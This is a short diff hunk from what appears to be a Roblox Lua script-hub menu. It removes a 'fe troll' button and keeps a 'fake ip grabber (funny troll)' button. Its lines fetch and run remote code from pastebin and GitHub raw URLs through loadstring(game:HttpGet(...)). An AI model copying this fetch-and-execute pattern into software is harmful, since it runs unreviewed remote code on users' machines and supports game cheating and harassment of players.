@@ -155,13 +155,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/U
 })
 
 local Button = MainTab:CreateButton({
-   Name = "fe troll (works on r6 and r15)",
-   Callback = function()
- loadstring(game:HttpGet("https://pastebin.com/raw/RNWgaqCE",true))()
-   end,
-})
-
-local Button = MainTab:CreateButton({
    Name = "fake ip grabber (funny troll)",
    Callback = function()
  local ScreenGui = Instance.new("ScreenGui")
